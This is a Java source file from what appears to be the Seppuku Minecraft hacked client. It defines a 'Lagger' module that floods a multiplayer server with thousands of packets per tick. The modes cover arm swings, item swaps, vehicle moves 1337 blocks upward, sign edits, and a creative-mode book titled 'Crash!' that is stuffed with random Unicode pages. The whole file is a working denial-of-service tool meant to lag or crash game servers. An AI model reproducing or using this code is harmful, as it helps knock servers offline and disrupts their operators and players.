package me.rigamortis.seppuku.impl.module.misc;

import me.rigamortis.seppuku.api.event.EventStageable;
import me.rigamortis.seppuku.api.event.player.EventPlayerUpdate;
import me.rigamortis.seppuku.api.module.Module;
import me.rigamortis.seppuku.api.value.NumberValue;
import me.rigamortis.seppuku.api.value.OptionalValue;
import net.minecraft.client.Minecraft;
import net.minecraft.entity.Entity;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.*;
import net.minecraft.tileentity.TileEntity;
import net.minecraft.tileentity.TileEntitySign;
import net.minecraft.util.EnumHand;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.text.TextComponentString;
import team.stiff.pomelo.impl.annotated.handler.annotation.Listener;

import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

/**
 * Author Seth
 * 5/3/2019 @ 8:49 PM.
 */
public final class LaggerModule extends Module {

    public final OptionalValue mode = new OptionalValue("Mode", new String[]{"Mode", "M"}, 0, new String[]{"Boxer", "Swap", "Movement", "Sign", "Nbt"});

    public final NumberValue packets = new NumberValue("Packets", new String[]{"pckts", "packet"}, 500, Integer.class, 0, 5000, 1);

    final Minecraft mc = Minecraft.getMinecraft();

    private String rand;

    public LaggerModule() {
        super("Lagger", new String[]{"Lag"}, "Spams unoptimized packets", "NONE", -1, ModuleType.MISC);
        final IntStream gen = new Random().ints(0x80, 0x10ffff - 0x800).map(i -> i < 0xd800 ? i : i + 0x800);
        this.rand = gen.limit(1024).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
    }

    @Override
    public String getMetaData() {
        return this.mode.getSelectedOption();
    }

    @Listener
    public void onUpdate(EventPlayerUpdate event) {
        if (event.getStage() == EventStageable.EventStage.PRE) {
            switch (this.mode.getInt()) {
                case 0:
                    for (int i = 0; i <= this.packets.getInt(); i++) {
                        mc.player.connection.sendPacket(new CPacketAnimation(EnumHand.MAIN_HAND));
                    }
                    break;
                case 1:
                    for (int i = 0; i <= this.packets.getInt(); i++) {
                        mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, BlockPos.ORIGIN, mc.player.getHorizontalFacing()));
                    }
                    break;
                case 2:
                    for (int i = 0; i <= this.packets.getInt(); i++) {
                        final Entity riding = mc.player.getRidingEntity();
                        if (riding != null) {
                            riding.posX = mc.player.posX;
                            riding.posY = mc.player.posY + 1337;
                            riding.posZ = mc.player.posZ;
                            mc.player.connection.sendPacket(new CPacketVehicleMove(riding));
                        }
                    }
                    break;
                case 3:
                    for (TileEntity te : mc.world.loadedTileEntityList) {
                        if (te instanceof TileEntitySign) {
                            final TileEntitySign tileEntitySign = (TileEntitySign) te;

                            for (int i = 0; i <= this.packets.getInt(); i++) {
                                mc.player.connection.sendPacket(new CPacketUpdateSign(tileEntitySign.getPos(), new TextComponentString[]{new TextComponentString("give"), new TextComponentString("riga"), new TextComponentString("the"), new TextComponentString("green book")}));
                            }
                        }
                    }
                    break;
                case 4:
                    final ItemStack itemStack = new ItemStack(Items.WRITABLE_BOOK);
                    final NBTTagList pages = new NBTTagList();

                    for (int page = 0; page < 50; page++) {
                        pages.appendTag(new NBTTagString(this.rand));
                    }

                    final NBTTagCompound tag = new NBTTagCompound();
                    tag.setString("author", mc.session.getUsername());
                    tag.setString("title", "Crash!");
                    tag.setTag("pages", pages);
                    itemStack.setTagCompound(tag);

                    for (int i = 0; i <= this.packets.getInt(); i++) {
                        mc.player.connection.sendPacket(new CPacketCreativeInventoryAction(0, itemStack));
                        // mc.player.connection.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, itemStack, (short)0));
                    }
                    break;
            }
        }
    }

}
